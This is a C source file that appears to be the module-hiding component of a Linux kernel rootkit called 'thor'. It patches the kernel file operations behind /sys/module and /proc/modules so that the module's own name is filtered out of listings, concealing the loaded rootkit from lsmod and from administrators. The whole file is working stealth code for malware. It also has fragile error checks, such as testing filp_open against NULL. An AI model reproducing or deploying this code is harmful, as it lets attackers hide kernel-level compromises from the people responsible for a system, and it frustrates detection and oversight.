#include "lsmodhider.h"

#include "helper.h"
#include "logging.h"
#include "module.h"

#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/version.h>

/* function prototypes */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_sysmodule_iterate(struct file *file, void *dirent, filldir_t filldir);
#else
static int thor_sysmodule_iterate(struct file *file, struct dir_context *ctx);
#endif
static int thor_sysmodule_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

ssize_t thor_procmodules_read(struct file *file, char __user *buf, size_t len, loff_t *off);

/* file operations on /sys/module */
static struct file_operations *sysmodule_fops;

/* file operations on /proc/modules */
static struct file_operations *procmodules_fops;

/* pointer to original /sys/module iterate function */
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int (*orig_sysmodule_iterate)(struct file *file, void *dirent, filldir_t filldir);
#else
static int (*orig_sysmodule_iterate)(struct file *, struct dir_context *);
#endif

/* pointer to original /proc/modules read function */
ssize_t (*orig_procmodules_read) (struct file *, char __user *, size_t, loff_t *);

/* pointer to original /sys/module filldir function */
static int (*orig_sysmodule_filldir)(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type);

int lsmodhider_init(void)
{
    struct file *filep_sysmodule;
    struct file *filep_procmodules;

    filep_sysmodule = filp_open("/sys/module", O_RDONLY, 0);
    if (filep_sysmodule == NULL) {
        LOG_ERROR("could not open /sys/module");
        return -1;
    }

    sysmodule_fops = (struct file_operations*) filep_sysmodule->f_op;
    filp_close(filep_sysmodule, NULL);

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    orig_sysmodule_iterate = sysmodule_fops->readdir;
#else
    orig_sysmodule_iterate = sysmodule_fops->iterate;
#endif
    set_addr_rw(sysmodule_fops);
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    sysmodule_fops->readdir = thor_sysmodule_iterate;
#else
    sysmodule_fops->iterate = thor_sysmodule_iterate;
#endif
    set_addr_ro(sysmodule_fops);

    filep_procmodules = filp_open("/proc/modules", O_RDONLY, 0);
    if (filep_procmodules == NULL) {
        LOG_ERROR("could not open /proc/modules");
        return -1;
    }

    procmodules_fops = (struct file_operations*) filep_procmodules->f_op;
    filp_close(filep_procmodules, NULL);

    orig_procmodules_read = procmodules_fops->read;

    set_addr_rw(procmodules_fops);
    procmodules_fops->read = thor_procmodules_read;
    set_addr_ro(procmodules_fops);

    return 0;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
static int thor_sysmodule_iterate(struct file *file, void *dirent, filldir_t filldir)
{
    return orig_sysmodule_iterate(file, dirent, thor_sysmodule_filldir);
}
#else
static int thor_sysmodule_iterate(struct file *file, struct dir_context *ctx)
{
    int ret;
    filldir_t *ctx_actor;

    /* capture original filldir function */
    orig_sysmodule_filldir = ctx->actor;

    /* cast away const from ctx->actor */
    ctx_actor = (filldir_t*)(&ctx->actor);

    /* store our filldir in ctx->actor */
    *ctx_actor = thor_sysmodule_filldir;
    ret = orig_sysmodule_iterate(file, ctx);

    /* restore original filldir */
    *ctx_actor = orig_sysmodule_filldir;

    return ret;
}
#endif

static int thor_sysmodule_filldir(void *buf, const char *name, int namelen,
        loff_t offset, u64 ino, unsigned d_type)
{
    if (strcmp(name, THOR_MODULENAME) == 0) {
        return 0;
    }

    return orig_sysmodule_filldir(buf, name, namelen, offset, ino, d_type);
}

ssize_t thor_procmodules_read(struct file *file, char __user *buf, size_t len, loff_t *off)
{
    ssize_t ret;
    char *thor_occ;

    ret = orig_procmodules_read(file, buf, len, off);

    /* find and hide thor from /proc/modules */
    thor_occ = strnstr(buf, THOR_MODULENAME, len);

    if (thor_occ != NULL) { /* thor found */
        char *nl;
        /* find newline and copy the rest of the buffer over the thor
         * occurrence */
        nl = strnstr(thor_occ, "\n", len - (thor_occ - buf));
        memcpy(thor_occ, nl+1, len - ((nl + 1) - buf));
        ret -= (nl+1 - thor_occ);
    }

    return ret;
}

void lsmodhider_cleanup(void)
{
    if (sysmodule_fops != NULL && orig_sysmodule_iterate != NULL) {
        set_addr_rw(sysmodule_fops);
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
        sysmodule_fops->readdir = orig_sysmodule_iterate;
#else
        sysmodule_fops->iterate = orig_sysmodule_iterate;
#endif
        set_addr_ro(sysmodule_fops);
    }

    if (procmodules_fops != NULL && orig_procmodules_read != NULL) {
        set_addr_rw(procmodules_fops);
        procmodules_fops->read = orig_procmodules_read;
        set_addr_ro(procmodules_fops);
    }
}

